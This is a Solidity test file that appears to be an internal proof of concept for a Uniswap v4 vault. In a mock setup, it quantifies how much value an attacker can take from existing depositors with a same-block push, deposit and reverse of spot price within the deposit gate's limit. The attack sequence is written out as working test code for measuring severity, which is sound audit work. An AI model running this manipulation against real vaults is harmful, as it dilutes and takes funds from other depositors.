// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.26;

import {Deployers} from "@uniswap/v4-core/test/utils/Deployers.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";

import {FeraVault} from "../../src/FeraVault.sol";
import {FeraHook} from "../../src/FeraHook.sol";
import {FeraShare} from "../../src/shares/FeraShare.sol";
import {RevenueDistributor} from "../../src/RevenueDistributor.sol";
import {IFeraHook} from "../../src/interfaces/IFeraHook.sol";
import {IFeraVault} from "../../src/interfaces/IFeraVault.sol";
import {IRevenueDistributor} from "../../src/interfaces/IRevenueDistributor.sol";
import {IAnchorStaking} from "../../src/interfaces/IAnchorStaking.sol";
import {FeraTypes} from "../../src/libraries/FeraTypes.sol";
import {FeraConstants} from "../../src/libraries/FeraConstants.sol";

import {Hooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";
import {LPFeeLibrary} from "@uniswap/v4-core/src/libraries/LPFeeLibrary.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice OPEN_DECISIONS.md#OD-25 empirical quantification (open-kritt finding, re-checked on
///         explicit founder request): deposit NAV is priced at SPOT, not TWAP, even when the
///         deposit gate's own deviation check passes. This measures — against the vault's OWN,
///         REAL band widths (not an artificially-narrow adversarial band) — how much value an
///         attacker can actually extract from existing holders by pushing spot to the gate's own
///         legal maximum (same block, so the TWAP genuinely hasn't moved) immediately before
///         depositing, then reversing.
///
///         Method: a reference holder ("ref") seeds the Active(1) tranche (narrowest bands in the
///         system: ±30% base, ±10% limit after rebalanceLimit — the worst realistic case). An
///         attacker then, in ONE block: (1) pushes spot by exactly the gate's legal max deviation,
///         (2) deposits a known amount, (3) reverses the push back to the pre-attack price. The
///         attacker's shares are valued at the RESTORED (fair) price and compared against what they
///         paid — any surplus is value extracted from ref, i.e. real dilution, not a rounding
///         artifact. Repeated at both the DEFAULT gate (200bps/2%) and the code-immutable MAXIMUM
///         legal gate (500bps/5%) an owner could dial up to.
contract DepositNavConvexity_PoCTest is Deployers {
    using StateLibrary for IPoolManager;

    FeraVault internal vault;
    FeraHook internal hook;
    RevenueDistributor internal rev;
    FeraShare internal shareImpl;

    PoolKey internal memeKey;
    PoolId internal memeId;

    address internal ref = address(this);
    address internal attacker = makeAddr("attacker");

    uint256 internal constant T0 = 10_000_000;
    uint256 internal constant COOLDOWN = 3_600;
    uint256 internal constant JIT = 1_800;

    function setUp() public {
        vm.warp(T0);
        deployFreshManagerAndRouters();
        deployMintAndApprove2Currencies();

        shareImpl = new FeraShare();
        rev = new RevenueDistributor(makeAddr("stakers"), makeAddr("treasury"), makeAddr("ops"));

        uint160 flags = uint160(
            Hooks.BEFORE_INITIALIZE_FLAG | Hooks.AFTER_ADD_LIQUIDITY_FLAG | Hooks.AFTER_REMOVE_LIQUIDITY_FLAG
                | Hooks.BEFORE_SWAP_FLAG | Hooks.AFTER_SWAP_FLAG | Hooks.AFTER_ADD_LIQUIDITY_RETURNS_DELTA_FLAG
                | Hooks.AFTER_REMOVE_LIQUIDITY_RETURNS_DELTA_FLAG
        );
        address hookAddr = address(flags | (uint160(0xCEC5) << 14));
        vault = new FeraVault(
            manager, IFeraHook(hookAddr), IRevenueDistributor(address(rev)), IAnchorStaking(address(0)), address(shareImpl), address(this), address(this)
        );
        deployCodeTo("FeraHook.sol:FeraHook", abi.encode(manager, address(vault)), hookAddr);
        hook = FeraHook(hookAddr);

        memeKey = PoolKey({
            currency0: currency0,
            currency1: currency1,
            fee: LPFeeLibrary.DYNAMIC_FEE_FLAG,
            tickSpacing: 60,
            hooks: IHooks(hookAddr)
        });
        vault.setAllowedQuoteAsset(Currency.unwrap(currency0), true);
        memeId = vault.createBaseLimitPool(memeKey, FeraTypes.Regime.MEME, address(0), SQRT_PRICE_1_1, true, "MEME", "M");

        MockERC20(Currency.unwrap(currency0)).approve(address(vault), type(uint256).max);
        MockERC20(Currency.unwrap(currency1)).approve(address(vault), type(uint256).max);

        MockERC20(Currency.unwrap(currency0)).mint(attacker, 100_000_000e18);
        MockERC20(Currency.unwrap(currency1)).mint(attacker, 100_000_000e18);
        vm.startPrank(attacker);
        MockERC20(Currency.unwrap(currency0)).approve(address(vault), type(uint256).max);
        MockERC20(Currency.unwrap(currency1)).approve(address(vault), type(uint256).max);
        vm.stopPrank();
    }

    function _refreshTwap() internal {
        swap(memeKey, true, -1e15, "");
        swap(memeKey, false, -1e15, "");
    }

    function _pushToTick(int24 target) internal {
        (, int24 tick,,) = manager.getSlot0(memeId);
        bool up = target > tick;
        swapRouter.swap(
            memeKey,
            SwapParams({
                zeroForOne: !up,
                amountSpecified: -int256(5_000_000e18),
                sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(target)
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
    }

    /// @dev tick ≈ bps/10000 in log terms: ln(1+bps/10000)/ln(1.0001). Close enough for a same-block
    ///      push whose ONLY job is to land just inside the gate's legal deviation.
    function _ticksForBps(uint256 bps) internal pure returns (int24) {
        // 1 tick = 1.0001x ⇒ bps ticks slightly OVERSHOOTS bps% (e.g. 200 ticks ≈ 2.02%, not 2.00%) —
        // stay comfortably under the target gate so the ORIGINAL deviation check (not this PoC's
        // OD-25 concern) doesn't fire first.
        if (bps == 200) return 190; // ~1.92% (under the 200bps/2% default gate)
        if (bps == 500) return 480; // ~4.91% (under the 500bps/5% legal ceiling)
        revert("unsupported bps in this PoC");
    }

    function _seedActiveWithLimitBand() internal {
        vault.setKeeperActive(memeId, true);
        // Active(1): narrowest bands in the system (±30% base, ±10% limit after rebalanceLimit).
        vm.prank(ref);
        vault.deposit(memeId, 1, 2_000e18, 2_000e18, 0);
        vm.warp(block.timestamp + COOLDOWN + JIT);
        _refreshTwap();
        vault.skimIdle(memeId, 1);
        vault.rebalanceLimit(memeId, 1); // deploys the ±10% limit band from idle reserve
        vm.warp(block.timestamp + FeraConstants.MEME_MIN_REBALANCE_INTERVAL_SEC + 1);
        _refreshTwap();
    }

    /// @dev Core measurement, parameterized by the gate deviation (bps) the attacker pushes to.
    function _measureExtraction(uint256 gateBps, int24 pushTicks) internal returns (uint256 extractedBps) {
        _seedActiveWithLimitBand();
        vault.setDepositTwapGate(gateBps); // exercise exactly this gate value

        (, int24 fairTick,,) = manager.getSlot0(memeId);
        uint256 attackerPaid0 = 500e18;
        uint256 attackerPaid1 = 500e18;

        // Same block: push, deposit, reverse. dt==0 for both swaps ⇒ TWAP never moves (Gamma
        // defense) ⇒ the deviation gate's OWN check is measuring a REAL, gate-legal spot gap.
        _pushToTick(fairTick + pushTicks);
        vm.prank(attacker);
        uint256 attackerShares = vault.deposit(memeId, 1, attackerPaid0, attackerPaid1, 0);
        _pushToTick(fairTick); // reverse — restores the pre-attack (fair) price

        // Value the attacker's shares at the RESTORED fair price via the vault's own TWAP-quote
        // (quoteNav is exactly the manipulation-resistant, TWAP-priced external valuation surface).
        vm.warp(block.timestamp + FeraConstants.DEPOSIT_TWAP_WINDOW_SEC + 1);
        _refreshTwap();
        uint256 totalShares = IERC20(vault.shareToken(memeId, 1)).totalSupply();
        uint256 trancheQuoteNav = vault.quoteNav(memeId, 1); // in quote-token (currency0) terms
        uint256 attackerShareValue = (trancheQuoteNav * attackerShares) / totalShares;

        uint256 attackerPaidInQuote = attackerPaid0 + attackerPaid1; // ~1:1 pool, both legs ≈ quote terms
        if (attackerShareValue <= attackerPaidInQuote) {
            extractedBps = 0;
        } else {
            extractedBps = ((attackerShareValue - attackerPaidInQuote) * FeraConstants.BPS) / attackerPaidInQuote;
        }

        emit log_named_uint("gate bps", gateBps);
        emit log_named_uint("push ticks", uint256(int256(pushTicks)));
        emit log_named_uint("attacker paid (quote terms)", attackerPaidInQuote);
        emit log_named_uint("attacker shares value at restored fair price", attackerShareValue);
        emit log_named_uint("extracted, bps of attacker's own outlay", extractedBps);
    }

    /// @notice DEFAULT gate (200bps/2%, what every live pool actually runs unless the owner
    ///         deliberately widens it) — the realistic, day-to-day exposure.
    function test_convexity_atDefaultGate_2pct() public {
        uint256 extracted = _measureExtraction(FeraConstants.DEPOSIT_TWAP_GATE_DEFAULT_BPS, _ticksForBps(200));
        emit log_string("--- verdict: default gate ---");
        assertLt(extracted, 300, unicode"unexpectedly large extraction at the DEFAULT 2% gate — reconsider OD-25 severity upward");
    }

    /// @notice The code-immutable MAXIMUM legal gate (500bps/5%) an owner could dial up to —
    ///         worst case the CONTRACT allows, not just the deployed default.
    function test_convexity_atMaxLegalGate_5pct() public {
        uint256 extracted = _measureExtraction(FeraConstants.DEPOSIT_TWAP_GATE_MAX_BPS, _ticksForBps(500));
        emit log_string("--- verdict: max legal gate ---");
        assertLt(extracted, 800, unicode"unexpectedly large extraction at the MAX LEGAL 5% gate — reconsider OD-25 severity upward");
    }
}
